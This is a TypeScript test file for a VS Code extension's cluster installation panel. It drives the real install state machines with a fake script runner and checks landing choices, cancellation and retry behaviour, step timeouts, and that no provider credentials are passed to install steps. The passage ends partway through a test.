// The Add a cluster page, driven the way an operator drives it (memql#3514).
//
// WHY THIS FILE EXISTS. Nothing tested `AddClusterPanel` until four defects
// reached main, each satisfied by something ADJACENT to the requirement -- a
// type existing, a state transition happening, a button rendering -- while the
// thing the operator needed did not happen: Retry that re-ran nothing, a failed
// run that claimed "Finished", a repair that could not pass wave 2, a step with
// no timeout. The kit rewrite (memql#5118 audit) added its own list: a landing
// that invented a verdict before detection ran, a password prompt whose
// dismissal still started an uninstall, Retry dropped while other steps
// finished, Cancel that said "Cancelled" while the cluster step kept working,
// and a `make up` cluster the page offered to uninstall and then could not.
//
// WHAT IS REAL HERE, AND WHY IT MATTERS. The state machines are the real ones.
// The graph is the SHIPPED `scripts/install/graph/install.json`. The plan, the
// executor, the receipt and the params each step is handed are all real. The
// ONLY fake is script EXECUTION: `RunScript`, injected through
// `AddClusterDeps.runScript` -- and the harness injects one ALWAYS, because the
// page asks detect.sh whether this computer is supported before it offers
// Install, and a unit lane must never run a capability script for real.
//
// WHAT IS MODELLED BY HAND. The page's own script, and nothing else: a click
// on the page posts `{ type: data-act, value: data-value }`, a keystroke posts
// `{ type: "input", field, value }` and a switch posts `{ type: <switch-act>,
// id, checked, value }` (src/webview/ui/runtime.ts). `panel.send` plays those.
// The page never says `ready` here unless a case does, so every render is a
// new document and `html` is the whole page -- except where a case sends
// `ready` to watch what travels as a message instead.

import test from "node:test";
import assert from "node:assert/strict";
import * as fs from "node:fs";
import * as os from "node:os";
import * as path from "node:path";

import type { ExtensionContext } from "vscode";

import { ClusterPresence, type AddClusterAction, type PresenceOptions } from "../src/clusters/presence.js";
import type { Receipt } from "../src/install/receipt.js";
import { graphDocumentPath, loadGraphFile, type Verify } from "../src/install/graph.js";
import type { ScriptOutcome, ScriptRun } from "../src/install/runner.js";
import {
  AddClusterPanel,
  type AddClusterDeps,
  type DestructiveConfirmation,
} from "../src/webview/addClusterPanel.js";
import {
  recorded,
  resetRecorded,
  setNextInputBoxResult,
  setNextWarningMessageChoice,
  type StubWebviewPanel,
} from "./support/vscodeStub.js";
import { LocalRuns } from "../src/deploy/localRun.js";

// dist-test/test -> dist-test -> editors/vscode -> editors -> the repository.
const REPO_ROOT = path.resolve(__dirname, "..", "..", "..", "..");

// A home of our own. The panel writes a receipt and a clusters.yaml on a
// successful run, and a test has no business touching the developer's ~/.memql.
const HOME = fs.mkdtempSync(path.join(os.tmpdir(), "memql-addcluster-panel-"));

// A PATH AND NOTHING ELSE (epic memql#5088): the value a pre-memql#5088
// receipt recorded, which the case below asserts is never used.
const STALE_KEY_PATH = path.join(HOME, "provider-key");

// -----------------------------------------------------------------------------
// the fake runner
// -----------------------------------------------------------------------------

/**
 * The envelope a step's OWN verify predicate asks for, derived from the shipped
 * graph rather than restated.
 */
function satisfying(verify: Verify): Record<string, unknown> {
  const field = (verify.field ?? "").replace(/^result\./, "");
  switch (verify.kind) {
    case "scriptOk":
      return {};
    case "resultTrue":
      return { [field]: true };
    case "resultFalse":
      return { [field]: false };
    case "resultNonEmpty":
      return { [field]: `a-${field}` };
    case "resultEquals":
      return { [field]: verify.value ?? "" };
    default:
      return {};
  }
}

interface FakeRunner {
  run: (run: ScriptRun) => Promise<ScriptOutcome>;
  /** Every invocation, in order, exactly as the executor made it. */
  calls: ScriptRun[];
  /** Capability ids this runner reports as failing, and with what exit code. */
  failing: Map<string, number>;
}

/**
 * A script runner that does what each step's verify asks -- unless told not to.
 *
 * Keyed by CAPABILITY; the failure it produces is the normal failure shape for
 * this installer: a well-formed envelope whose result does not satisfy the
 * verify. It covers the install graph AND the uninstall graph, so one runner
 * drives either run.
 */
async function fakeRunner(
  failing: Record<string, number> = {},
  /** Extra result fields per capability, merged over what the verify asks for. */
  extraResults: Record<string, Record<string, unknown>> = {},
): Promise<FakeRunner> {
  const verifyFor = new Map<string, Verify>();
  for (const kind of ["install", "uninstall"] as const) {
    const graph = await loadGraphFile(graphDocumentPath(kind, REPO_ROOT));
    for (const step of graph.steps) if (!verifyFor.has(step.script)) verifyFor.set(step.script, step.verify);
  }

  const fake: FakeRunner = {
    calls: [],
    failing: new Map(Object.entries(failing)),
    run: async (run: ScriptRun): Promise<ScriptOutcome> => {
      fake.calls.push(run);
      const capability = run.capability ?? "";
      const verify = verifyFor.get(capability);
      assert.ok(verify !== undefined, `the fake runner was asked for unknown capability ${capability}`);
      const exitCode = fake.failing.get(capability);
      const ok = exitCode === undefined;
      // An uninstall removal reports the kind it was asked to remove.
      const kind = run.params["kind"];
      const result = ok
        ? { ...satisfying(verify), ...(kind === undefined ? {} : { kind }), ...(extraResults[capability] ?? {}) }
        : { ...(extraResults[capability] ?? {}) };
      return {
        argv: [run.scriptPath],
        exitCode: ok ? 0 : exitCode,
        signal: null,
        stdout: "",
        stderr: "",
        envelope: {
          ok,
          capability,
          changed: ok,
          result,
          error: ok ? null : { code: exitCode, message: `the fake refused ${capability}` },
        },
      };
    },
  };
  return fake;
}

// -----------------------------------------------------------------------------
// the harness
// -----------------------------------------------------------------------------

interface Harness {
  /** What the panel last rendered. */
  html(): string;
  /** Posts what a click in the page would post. */
  post(message: unknown): void;
  panel: StubWebviewPanel;
  receiptFile: string;
  clustersPath: string;
  runner: FakeRunner;
  close(): void;
}

function context(): ExtensionContext {
  return { subscriptions: [] } as unknown as ExtensionContext;
}

type Verdict = "absent" | "installed-healthy" | "installed-unreachable" | "present-unreceipted";

/** A receipt with one executed artifact, which is what presence counts as an install. */
const INSTALLED_RECEIPT = {
  version: 1,
  graph: "install",
  startedAt: "",
  updatedAt: "",
  entries: [
    {
      stepId: "toolK3d",
      script: "install/tool.sh",
      receipt: "binary",
      preExisting: false,
      params: {},
      result: {},
      changed: true,
      recordedAt: "",
    },
  ],
};

/**
 * A presence probe that answers without the network or the operator's files:
 * the real `ClusterPresence`, over injected readers.
 */
function presenceFor(
  verdict: Verdict,
  opts: { registered?: boolean; overrides?: Partial<PresenceOptions> } = {},
): ClusterPresence {
  const registered = opts.registered ?? false;
  return new ClusterPresence({
    clustersPath: path.join(HOME, "clusters.yaml"),
    receiptPath: path.join(HOME, "no-such-receipt.json"),
    readReceiptFile: async () =>
      verdict === "absent" || verdict === "present-unreceipted" ? null : (INSTALLED_RECEIPT as unknown as Receipt),
    readClusters: async () => ({
      ok: true as const,
      file: {
        selectedCluster: "",
        clusters: registered ? [{ name: "memql", endpoint: "api.memql.localhost:443", domain: "memql.localhost", local: true }] : [],
      },
    }),
    probe: async () => verdict === "installed-healthy",
    listClusters: async () => (verdict === "present-unreceipted" ? ["memql"] : []),
    ...(opts.overrides ?? {}),
  });
}

/**
 * Presence over the case's OWN receipt and clusters.yaml, which the panel's
 * runs write: what the page finds when it looks again after a run.
 */
function livePresence(): { presence: ClusterPresence; bind: (h: Harness) => void } {
  let receiptFile = "";
  let clustersPath = "";
  const presence = new ClusterPresence({
    clustersPath: path.join(HOME, "unused.yaml"),
    readReceiptFile: async () => {
      try {
        return JSON.parse(fs.readFileSync(receiptFile, "utf8")) as Receipt;
      } catch {
        return null;
      }
    },
    readClusters: async () => {
      const yaml = clustersPath !== "" && fs.existsSync(clustersPath) ? fs.readFileSync(clustersPath, "utf8") : "";
      return {
        ok: true as const,
        file: {
          selectedCluster: "",
          clusters: /local: true/.test(yaml) ? [{ name: "memql", endpoint: "api.memql.localhost:443", local: true }] : [],
        },
      };
    },
    probe: async () => true,
  });
  return {
    presence,
    bind: (h) => {
      receiptFile = h.receiptFile;
      clustersPath = h.clustersPath;
    },
  };
}

interface OpenOptions {
  action?: AddClusterAction;
  runner?: FakeRunner;
  verdict?: Verdict;
  registered?: boolean;
  presence?: ClusterPresence;
  /** Seeded before the panel opens, for the repair and uninstall cases. */
  receipt?: unknown;
  /** Seeded clusters.yaml, for the cases that read it back. */
  clustersYaml?: string;
  confirmDestructive?: (prompt: DestructiveConfirmation) => Promise<boolean>;
  /** Defaults to "sudo runs without asking": no case may spawn the real sudo. */
  sudoIsFree?: () => Promise<boolean>;
  listLocalClusters?: () => Promise<string[]>;
  isSignedIn?: (name: string) => boolean;
  removeRegistryEntry?: (name: string) => Promise<unknown>;
  probeCluster?: AddClusterDeps["probeCluster"];
  runs?: LocalRuns;
}

async function open(options: OpenOptions = {}): Promise<Harness> {
  resetRecorded();
  const dir = fs.mkdtempSync(path.join(HOME, "case-"));
  const receiptFile = path.join(dir, "install-receipt.json");
  const clustersPath = path.join(dir, "clusters.yaml");
  if (options.receipt !== undefined) fs.writeFileSync(receiptFile, JSON.stringify(options.receipt));
  if (options.clustersYaml !== undefined) fs.writeFileSync(clustersPath, options.clustersYaml);
  // ALWAYS a runner: the landing asks detect.sh about the platform.
  const runner = options.runner ?? (await fakeRunner());

  const deps: AddClusterDeps = {
    diagnostics: { appendLine: () => {} },
    clustersPath,
    receiptFile,
    installRoot: REPO_ROOT,
    // Every run writes a record (memql#3739); keep it out of the real ~/.memql/runs.
    runsDir: path.join(dir, "runs"),
    refreshTree: () => undefined,
    removeRegistryEntry: options.removeRegistryEntry ?? (async () => undefined),
    runScript: runner.run,
    sudoIsFree: options.sudoIsFree ?? (async () => true),
    sudoAccepts: async () => true,
    ...(options.confirmDestructive ? { confirmDestructive: options.confirmDestructive } : {}),
    ...(options.listLocalClusters ? { listLocalClusters: options.listLocalClusters } : {}),
    ...(options.isSignedIn ? { isSignedIn: options.isSignedIn } : {}),
    // Never the real https probe: a unit lane does not dial out.
    probeCluster: options.probeCluster ?? (async () => ({ ok: false, reason: "no network in this lane" })),
    // A slot of its own per case, unless the case shares one on purpose: a run
    // an earlier case left going must not refuse this one.
    runs: options.runs ?? new LocalRuns(),
  };

  AddClusterPanel.show(
    context(),
    options.presence ?? presenceFor(options.verdict ?? "absent", { registered: options.registered ?? false }),
    deps,
    options.action,
  );
  const panel = recorded.webviews[recorded.webviews.length - 1]!;
  return {
    panel,
    receiptFile,
    clustersPath,
    runner,
    // Apostrophes and quotes as a reader sees them, so "Couldn't" matches.
    html: () => decode(panel.html),
    post: (message: unknown) => panel.send(message),
    close: () => panel.close(),
  };
}

function decode(html: string): string {
  return html.replace(/&#39;/g, "'").replace(/&quot;/g, '"');
}

/**
 * Whether the page shows `re`: in the document, or -- once the page has said
 * `ready` and the panel patches instead of re-assigning -- in a region it
 * posted since.
 */
function shows(h: Harness, re: RegExp): boolean {
  if (re.test(h.html())) return true;
  return h.panel.posted.some((m) => {
    const regions = (m as { type?: string; regions?: Record<string, string> }).regions;
    return (m as { type?: string }).type === "patch" && regions !== undefined && Object.values(regions).some((r) => re.test(decode(r)));
  });
}

/** How many primary buttons the page's action bar carries. */
function primaries(html: string): number {
  return html.split('data-tone="primary" data-act=').length - 1;
}

/** A keystroke, as the page posts it. */
function type(h: Harness, field: string, value: string): void {
  h.post({ type: "input", field, value });
}

/** Fills the install form the way typing into it does, then presses Install. */
function beginInstall(h: Harness): void {
  h.post({ type: "choose", value: "install" });
  type(h, "domain", "memql.localhost");
  type(h, "ownerFirstName", "Ada");
  type(h, "ownerLastName", "Lovelace");
  type(h, "ownerEmail", "ada@example.com");
  h.post({ type: "begin" });
}

/**
 * Waits for a condition the page reaches asynchronously. The message handler
 * is synchronous and starts work with `void`, so a bounded poll is what a
 * caller has, and the bound turns "this hangs" into a named failure.
 */
async function until(condition: () => boolean, what: string): Promise<void> {
  for (let i = 0; i < 3_000; i += 1) {
    if (condition()) return;
    await new Promise((resolve) => setTimeout(resolve, 1));
  }
  throw new Error(`timed out waiting for ${what}`);
}

const INSTALLED = /MemQL is installed/;

/** Wraps a runner so ONE capability blocks until the case lets it go. Install before open(). */
function gateOn(runner: FakeRunner, capability: string): { reached: () => boolean; release: () => void } {
  let release = (): void => {};
  const held = new Promise<void>((resolve) => {
    release = resolve;
  });
  let reached = false;
  const inner = runner.run;
  runner.run = async (run) => {
    if (run.capability === capability) {
      reached = true;
      await held;
    }
    return inner(run);
  };
  return { reached: () => reached, release };
}

/** The acts on the page's action bar, in order. */
function barActs(html: string): string[] {
  const bar = html.slice(html.indexOf('<div class="mq-actbar"'));
  return [...bar.matchAll(/data-act="([^"]+)"/g)].map((m) => m[1]!);
}

/** The progress messages the panel posted, newest last. */
function progressPosts(h: Harness): Array<Record<string, unknown>> {
  return h.panel.posted.filter((m) => (m as { type?: unknown }).type === "progress") as Array<Record<string, unknown>>;
}

// -----------------------------------------------------------------------------
// the landing: never a guess, and only what applies
// -----------------------------------------------------------------------------

test("the first paint is the shape of the list, never a verdict detection has not reached", async () => {
  // THE DEFECT: the page's defaults were `installed-unreachable` and
  // registered, so before detection ran it said "installed, but not
  // answering" and offered Repair and Uninstall -- on machines with nothing
  // installed.
  let answer = (): void => {};
  const held = new Promise<void>((resolve) => {
    answer = resolve;
  });
  const presence = presenceFor("absent", {
    overrides: {
      readReceiptFile: async () => {
        await held;
        return null;
      },
    },
  });
  const h = await open({ presence });
  try {
    const first = h.html();
    assert.match(first, /class="mq-skeleton"/, "loading is the shape of the content");
    assert.doesNotMatch(first, /not responding|not answering|Repair|Uninstall|Install MemQL/);
    assert.deepEqual(barActs(first), [], "no act before there is a verdict");
    answer();
    await until(() => /Install MemQL on this computer/.test(h.html()), "the verdict");
  } finally {
    answer();
    h.close();
  }
});

test("nothing local: Install and Connect, and nothing else", async () => {
  const h = await open({});
  try {
    await until(() => /Install MemQL on this computer/.test(h.html()), "the landing");
    const html = h.html();
    assert.match(html, /Connect to a cluster/);
    assert.doesNotMatch(html, /data-value="(repair|uninstall|signIn|reconnect|adopt|installGuided)"/);
    assert.match(html, /No local cluster/);
    assert.equal(h.panel.title, "Add a cluster");
  } finally {
    h.close();
  }
});

test("a local cluster that is installed and listed offers Sign in, Repair and Uninstall", async () => {
  const h = await open({ verdict: "installed-healthy", registered: true });
  try {
    await until(() => /data-value="signIn"/.test(h.html()), "the landing");
    const html = h.html();
    assert.match(html, /data-value="repair"/);
    assert.match(html, /data-value="uninstall"/);
    assert.doesNotMatch(html, /data-value="install"/, "never an install over a cluster that is here");
    assert.match(html, /Local cluster running/);
  } finally {
    h.close();
  }
});

test("a choice the landing does not offer is refused, even when the page posts it", async () => {
  // THE CHANNEL FROM THE PAGE IS UNTRUSTED, and two of these choices WRITE:
  // reconnect and adopt put a list entry in clusters.yaml with no form in
  // front of them. On a cluster that is already listed, neither is offered,
  // and neither may happen -- nor may an Install over the cluster that is here.
  const h = await open({ verdict: "installed-healthy", registered: true });
  try {
    await until(() => /data-value="signIn"/.test(h.html()), "the landing");
    for (const value of ["reconnect", "adopt", "install", "installGuided", "nonsense"]) {
      h.post({ type: "choose", value });
    }
    await new Promise((resolve) => setTimeout(resolve, 20));
    assert.ok(!fs.existsSync(h.clustersPath), "a choice the landing did not offer wrote a list entry");
    assert.ok(!recorded.executed.includes("memql.clusters.select"), "and selected it");
    assert.doesNotMatch(h.html(), /data-act="begin"/, "an install form over a cluster that is here");
    assert.match(h.html(), /data-value="signIn"/, "still the landing");
  } finally {
    h.close();
  }
});

test("Sign in on the landing runs the one sign-in command, for the listed cluster", async () => {
  const h = await open({
    verdict: "installed-healthy",
    registered: true,
    clustersYaml: "clusters:\n  - name: memql\n    endpoint: api.memql.localhost:443\n    domain: memql.localhost\n    local: true\n",
  });
  try {
    await until(() => /data-value="signIn"/.test(h.html()), "the landing");
    h.post({ type: "choose", value: "signIn" });
    await until(() => recorded.executed.includes("memql.clusters.signIn"), "the sign-in command");
    const args = recorded.executedArgs[recorded.executed.indexOf("memql.clusters.signIn")]![0] as {
      cluster: { name: string };
    };
    assert.equal(args.cluster.name, "memql");
  } finally {
    h.close();
  }
});

test("signed in already, the landing offers MemQL OS instead of a second sign-in", async () => {
  const h = await open({ verdict: "installed-healthy", registered: true, isSignedIn: (name) => name === "memql" });
  try {
    await until(() => /data-value="openOs"/.test(h.html()), "the landing");
    assert.doesNotMatch(h.html(), /data-value="signIn"/);
  } finally {
    h.close();
  }
});

test("a cluster make up built, listed by hand, offers no Repair: there is no install to replay", async () => {
  const presence = presenceFor("installed-healthy", {
    registered: true,
    overrides: { readReceiptFile: async () => null },
  });
  const h = await open({ presence });
  try {
    await until(() => /data-value="signIn"/.test(h.html()), "the landing");
    assert.doesNotMatch(h.html(), /data-value="repair"/);
    assert.match(h.html(), /data-value="uninstall"/, "and it can still be uninstalled");
  } finally {
    h.close();
  }
});

test("a local cluster that is here but not in the list offers Connect to it and Uninstall", async () => {
  for (const verdict of ["installed-unreachable", "present-unreceipted"] as const) {
    const h = await open({ verdict });
    try {
      await until(() => /Connect to it/.test(h.html()), `the landing for ${verdict}`);
      const html = h.html();
      assert.match(html, verdict === "present-unreceipted" ? /data-value="adopt"/ : /data-value="reconnect"/);
      assert.match(html, /data-value="uninstall"/);
      assert.doesNotMatch(html, /data-value="install"/);
    } finally {
      h.close();
    }
  }
});

test("an unsupported computer gets one sentence and Connect, and runs nothing but detect", async () => {
  const runner = await fakeRunner();
  const inner = runner.run;
  const darwin = "unsupported platform darwin/amd64: the local cluster installer targets linux/amd64, darwin/arm64";
  runner.run = async (run) => {
    if (run.capability === "install.detect") {
      runner.calls.push(run);
      return {
        argv: [run.scriptPath],
        exitCode: 3,
        signal: null,
        stdout: "",
        stderr: darwin,
        envelope: {
          ok: false,
          capability: "install.detect",
          changed: false,
          result: { os: "darwin", arch: "amd64", supported: false },
          error: { code: 3, message: darwin },
        },
      };
    }
    return inner(run);
  };
  // Opened by "Create Deployment", which names Install -- not offered here.
  const h = await open({ runner, action: "install" });
  try {
    await until(() => /can't run a local MemQL cluster/.test(h.html()), "the landing");
    const html = h.html();
    assert.match(html, /data-value="connect"/);
    assert.doesNotMatch(html, /data-value="install"|data-field="version"/, "no form for a run that cannot happen");
    assert.equal(h.panel.title, "Add a cluster", "the tab says what the page is doing");
    assert.ok(runner.calls.every((c) => c.capability === "install.detect"), "only detect may run");
  } finally {
    h.close();
  }
});

test("Repair from a menu on a machine with nothing installed lands on the landing, not a form", async () => {
  // THE DEFECT: `openOn` skipped the landing's rules, so Repair on an empty
  // machine opened "Repair the local cluster" and ran a full install under
  // repair wording.
  const h = await open({ action: "repair" });
  try {
    await until(() => /Install MemQL on this computer/.test(h.html()), "the landing");
    assert.doesNotMatch(h.html(), /data-act="begin"/);
    assert.equal(h.panel.title, "Add a cluster");
  } finally {
    h.close();
  }
});

test("Repair from a menu reaches the form for a broken install that dropped out of the list", async () => {
  // Kept from before the redesign: an install that is not answering is
  // repairable whether or not it is still in the list. The Deployments
  // page's Repair opens this page on that branch, and must not dead-end.
  const h = await open({ verdict: "installed-unreachable", registered: false, action: "repair" });
  try {
    await until(() => /data-act="begin"/.test(h.html()), "the repair form");
    assert.equal(h.panel.title, "Repair MemQL");
  } finally {
    h.close();
  }
});

test("a guided install is not offered, and a posted one does nothing", async () => {
  // "Install guided" and "Switch this step to guided" set a flag nothing that
  // runs a step ever read; the remedy's Run in terminal is the manual path.
  const h = await open({});
  try {
    await until(() => /Install MemQL on this computer/.test(h.html()), "the landing");
    assert.doesNotMatch(h.html(), /guided/i);
    h.post({ type: "choose", value: "installGuided" });
    await new Promise((resolve) => setTimeout(resolve, 10));
    assert.doesNotMatch(h.html(), /data-act="begin"/, "a guided choice opened the form");
  } finally {
    h.close();
  }
});

test("the verdict is looked at again on the way back, never kept from before", async () => {
  // THE DEFECT: the verdict was read once, so after an install and Back the
  // landing offered Install again. Presence here reads the case's REAL
  // receipt and clusters.yaml, which the run writes.
  const live = livePresence();
  const h = await open({ presence: live.presence });
  live.bind(h);
  try {
    beginInstall(h);
    await until(() => INSTALLED.test(h.html()), "the install");
    h.post({ type: "back" });
    await until(() => /data-value="signIn"|data-value="openOs"/.test(h.html()), "the landing, looked at again");
    assert.doesNotMatch(h.html(), /data-value="install"/, "Install offered over the cluster just built");
  } finally {
    h.close();
  }
});

// -----------------------------------------------------------------------------
// install: the run
// -----------------------------------------------------------------------------

test("a repair with no recorded provider key runs, and contacts no vendor", async () => {
  // After memql#4440 an install supplies no key; `providerKey` skips,
  // satisfied, so the repair simply proceeds.
  const runner = await fakeRunner();
  const h = await open({ action: "repair", runner, verdict: "installed-unreachable", registered: true });
  try {
    await until(() => /data-act="begin"/.test(h.html()), "the repair form");
    assert.equal(h.panel.title, "Repair MemQL");
    type(h, "ownerFirstName", "Ada");
    type(h, "ownerLastName", "Lovelace");
    type(h, "ownerEmail", "ada@example.com");
    h.post({ type: "begin" });
    await until(() => runner.calls.some((c) => c.capability === "install.dockerAccess"), "the graph to be entered");
    assert.ok(!runner.calls.some((c) => c.capability === "install.verifyProviderKey"), "a keyless repair called a vendor");
  } finally {
    h.close();
  }
});

test("an old receipt's recorded key does not come back", async () => {
  // A receipt written before epic memql#5088 still has a `providerKey` entry
  // with `key-file` and `provider` in its params. Nothing may read it.
  const runner = await fakeRunner();
  const h = await open({
    action: "repair",
    runner,
    verdict: "installed-unreachable",
    registered: true,
    receipt: {
      version: 1,
      graph: "install",
      startedAt: "2026-08-01T00:00:00Z",
      updatedAt: "2026-08-01T00:00:00Z",
      entries: [
        {
          stepId: "providerKey",
          script: "install.verifyProviderKey",
          receipt: "",
          preExisting: false,
          params: { provider: "openai", "key-file": STALE_KEY_PATH },
          result: { valid: true },
          changed: false,
          recordedAt: "2026-08-01T00:00:00Z",
        },
        {
          stepId: "seedBootstrap",
          script: "install.seedBootstrap",
          receipt: "",
          preExisting: false,
          params: {
            domain: "memql.localhost",
            "owner-email": "owner@example.com",
            "owner-first-name": "Ada",
            "owner-last-name": "Lovelace",
            "registration-mode": "invite_only",
          },
          result: {},
          changed: true,
          recordedAt: "2026-08-01T00:00:00Z",
        },
      ],
    },
  });
  try {
    // The reachable positive: the receipt was read (the owner is pre-filled,
    // and summarised beside "More options").
    await until(() => h.html().includes("Ada Lovelace"), "the receipt to be read");
    assert.ok(!h.html().includes(STALE_KEY_PATH), "the recorded key path was pre-filled onto the form");
    h.post({ type: "begin" });
    await until(() => runner.calls.some((c) => c.capability === "install.seedBootstrap"), "the bootstrap step");
    assert.ok(!runner.calls.some((c) => c.capability === "install.verifyProviderKey"));
    for (const call of runner.calls) {
      for (const flag of Object.keys(call.params)) {
        assert.ok(!/provider|key-file|vendor|secret|token/i.test(flag), `${call.capability} was handed --${flag}`);
      }
    }
  } finally {
    h.close();
  }
});

test("every step is invoked with a non-zero timeout", async () => {
  const h = await open({});
  try {
    beginInstall(h);
    await until(() => INSTALLED.test(h.html()), "the run to settle");
    assert.ok(h.runner.calls.length > 1, "the whole graph should have run");
    for (const call of h.runner.calls) {
      assert.ok(typeof call.timeoutMs === "number" && call.timeoutMs > 0, `step ${call.capability} was given no timeout`);
    }
  } finally {
    h.close();
  }
});

test("the panel hands no AI credential to any step, and calls no vendor", async () => {
  const h = await open({});
  try {
    beginInstall(h);
    await until(() => INSTALLED.test(h.html()), "the run to settle");
    assert.ok(h.runner.calls.length > 1);
    assert.ok(!h.runner.calls.some((c) => c.capability === "install.verifyProviderKey"));
    for (const call of h.runner.calls) {
      for (const [flag, value] of Object.entries(call.params)) {
        assert.ok(!/provider|key-file|vendor|secret|token|credential/i.test(flag), `${call.capability} was handed --${flag}`);
        assert.doesNotMatch(String(value), /^sk-/);
      }
    }
  } finally {
    h.close();
  }
});

test("the tab is called what the page is doing", async () => {
  const h = await open({});
  try {
    await until(() => /Install MemQL on this computer/.test(h.html()), "the landing");
    assert.equal(h.panel.title, "Add a cluster");
    h.post({ type: "choose", value: "install" });
    assert.equal(h.panel.title, "Install MemQL");
    h.post({ type: "back" });
    await until(() => h.panel.title === "Add a cluster", "the landing's title");
    h.post({ type: "choose", value: "connect" });
    assert.equal(h.panel.title, "Add a cluster");
  } finally {
    h.close();
  }
});

test("the form shows only what must be decided, and Install lives on the bar", async () => {
  const h = await open({});
  try {
    h.post({ type: "choose", value: "install" });
    await until(() => /data-act="begin"/.test(h.html()), "the form");
    const html = h.html();
    assert.match(html, /data-field="ownerFirstName"/);
    assert.match(html, /id="more-options" hidden/, "domain and version wait behind More options");
    assert.deepEqual(barActs(html), ["back", "begin"], "Cancel then Install, and nothing else");
  } finally {
    h.close();
  }
});

test("typing is recorded and patched, never a new document once the page is live", async () => {
  // THE DEFECT memql#3538 fixed by not rendering at all; the kit fixes it by
  // patching. Once the page has said `ready`, a keystroke changes regions and
  // never re-assigns the document the operator is typing into.
  const h = await open({});
  try {
    h.post({ type: "choose", value: "install" });
    await until(() => /data-act="begin"/.test(h.html()), "the form");
    h.post({ type: "ready" });
    const painted = h.panel.renders;
    type(h, "ownerFirstName", "A");
    type(h, "ownerFirstName", "Ad");
    type(h, "ownerFirstName", "Ada");
    assert.equal(h.panel.renders, painted, "a keystroke replaced the document");
  } finally {
    h.close();
  }
});

test("what was typed is still there when the form repaints for a refusal", async () => {
  const h = await open({});
  try {
    h.post({ type: "choose", value: "install" });
    type(h, "ownerFirstName", "Ada");
    type(h, "ownerLastName", "Lovelace");
    h.post({ type: "begin" });
    await until(() => /Enter your email address\./.test(h.html()), "the refusal");
    const html = h.html();
    assert.match(html, /value="Ada"/);
    assert.match(html, /value="Lovelace"/);
    assert.match(html, /Check the details/);
  } finally {
    h.close();
  }
});

test("the run's status and step count come from the state machine, while it runs", async () => {
  // The step checklist is gone from the run screen; "Step n of m" is how much
  // is left, and the status line is the running step's short label.
  const runner = await fakeRunner();
  const gate = gateOn(runner, "install.dockerAccess");
  const h = await open({ runner });
  try {
    beginInstall(h);
    await until(gate.reached, "the second step to be in flight");
    await until(() => /Checking Docker/.test(h.html()), "the status line");
    const html = h.html();
    assert.match(html, /Installing MemQL/);
    assert.match(html, /Step 2 of 1[0-9]/);
    assert.deepEqual(barActs(html), ["cancel"], "Cancel, as a text act, and nothing else");
    gate.release();
    await until(() => INSTALLED.test(h.html()), "the run to settle");
  } finally {
    gate.release();
    h.close();
  }
});

test("log lines and phases travel as messages; the document is not replaced per line", async () => {
  // THE DEFECT: every stderr line assigned a whole new document, so focus,
  // selection and the bar's animation were lost roughly once a second.
  const runner = await fakeRunner();
  const inner = runner.run;
  let emitted = false;
  let release = (): void => {};
  const held = new Promise<void>((resolve) => {
    release = resolve;
  });
  runner.run = async (run) => {
    if (run.capability === "install.dockerAccess") {
      for (let i = 0; i < 200; i += 1) run.onLog?.(`line ${i}`);
      emitted = true;
      await held;
    }
    return inner(run);
  };
  const h = await open({ runner });
  try {
    beginInstall(h);
    await until(() => /Installing MemQL/.test(h.html()), "the run screen");
    h.post({ type: "ready" });
    const before = h.panel.renders;
    await until(() => emitted, "the lines");
    await until(
      () => h.panel.posted.some((m) => (m as { type?: string }).type === "log"),
      "the lines to cross as a log message",
    );
    await new Promise((resolve) => setTimeout(resolve, 150));
    assert.equal(h.panel.renders, before, "a log line replaced the document");
    const lines = h.panel.posted
      .filter((m) => (m as { type?: string }).type === "log")
      .flatMap((m) => (m as { lines: { text: string; label?: string }[] }).lines);
    assert.equal(lines.filter((l) => /^line \d+$/.test(l.text)).length, 200);
    // THE LABEL ONCE, where the step's lines begin -- not on every line.
    assert.equal(lines.filter((l) => l.label === "Checking Docker").length, 1);
    assert.ok(progressPosts(h).length > 0, "the bar moves by message");
    release();
    await until(() => shows(h, INSTALLED), "the run to settle");
  } finally {
    release();
    h.close();
  }
});

// -----------------------------------------------------------------------------
// install: Cancel, and failures
// -----------------------------------------------------------------------------

test("Cancel says it is stopping until the run has actually stopped", async () => {
  // THE DEFECT: Cancel moved straight to "Cancelled" while the current wave
  // -- up to thirty minutes of cluster step -- kept working.
  const runner = await fakeRunner();
  const gate = gateOn(runner, "install.dockerAccess");
  const h = await open({ runner });
  try {
    beginInstall(h);
    await until(gate.reached, "a step in flight");
    h.post({ type: "cancel" });
    const stopping = h.html();
    assert.match(stopping, /Stopping after the current step/);
    assert.deepEqual(barActs(stopping), [], "nothing to press while it stops");
    assert.doesNotMatch(stopping, /Stopped</);
    gate.release();
    await until(() => /data-act="resume"/.test(h.html()), "the stopped screen");
    assert.match(h.html(), /Stopped/);
    assert.ok(!fs.existsSync(h.clustersPath), "nothing may be registered for a stopped install");
    assert.ok(fs.existsSync(h.receiptFile), "and what ran is recorded, so it can be uninstalled");
  } finally {
    gate.release();
    h.close();
  }
});

test("a failure while other steps finish offers nothing, then Retry once the run is over", async () => {
  // THE DEFECT: the failure screen appeared on the first failed step while
  // other branches kept running, Retry was offered, the click was dropped
  // (the old run held the lock), and the page ended on "Finished / Nothing
  // further to do".
  const runner = await fakeRunner({ "install.binary": 5 });
  const gate = gateOn(runner, "install.cloneStack");
  const h = await open({ runner });
  try {
    beginInstall(h);
    await until(gate.reached, "the sibling step in flight");
    await until(() => /Finishing other steps/.test(h.html()), "the failure, still finishing");
    assert.deepEqual(barActs(h.html()), [], "no Retry while the run is still in flight");
    assert.match(h.html(), /Couldn't install tools/, "the status names the failed step in the negative");
    const before = h.runner.calls.length;
    // THE WALL BEHIND THE ABSENT ACT: a Retry that arrives anyway (a stale
    // page, a double click) is not taken. Taken, it reset the failure while
    // the old run still held the lock, and the page ended on a run that
    // never reported again.
    h.post({ type: "retry" });
    assert.match(h.html(), /Finishing other steps/, "a Retry was taken while the run was still in flight");
    assert.match(h.html(), /Couldn't install tools/, "and the failure it would have wiped is still on screen");
    gate.release();
    await until(() => /data-act="retry"/.test(h.html()), "Retry, once the run is over");
    assert.equal(h.runner.calls.length >= before, true);
    assert.doesNotMatch(h.html(), /Nothing further to do|Finished/);
    // And now it re-runs.
    h.runner.failing.clear();
    const settled = h.runner.calls.length;
    h.post({ type: "retry" });
    await until(() => h.runner.calls.length > settled, "a second invocation");
    await until(() => INSTALLED.test(h.html()), "the retried run");
  } finally {
    gate.release();
    h.close();
  }
});

test("Retry runs the graph again rather than repainting a pending step", async () => {
